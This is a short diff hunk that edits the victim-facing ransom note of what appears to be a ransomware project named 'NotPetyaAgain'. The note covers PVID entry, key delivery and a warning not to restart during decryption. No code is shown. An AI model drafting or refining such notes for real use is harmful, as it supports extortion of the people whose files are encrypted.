@@ -15,7 +15,7 @@ on GitHub.
 3) Enter your PVID (provided below) via the website or script and the
 decryption key will be generated and provided.
 
-IMPORTANT: Once decryption begins, DO NOT RESTART OR TURN OFF YOUR PC!
-NotPetyaAgain will restart your PC automatically.
+IMPORTANT: Once decryption begins, DO NOT RESTART OR TURN OFF YOUR PC
+UNTIL THE DECRYPTION ROUTINE IS DONE!
 
 Your Personal Victim ID (PVID):
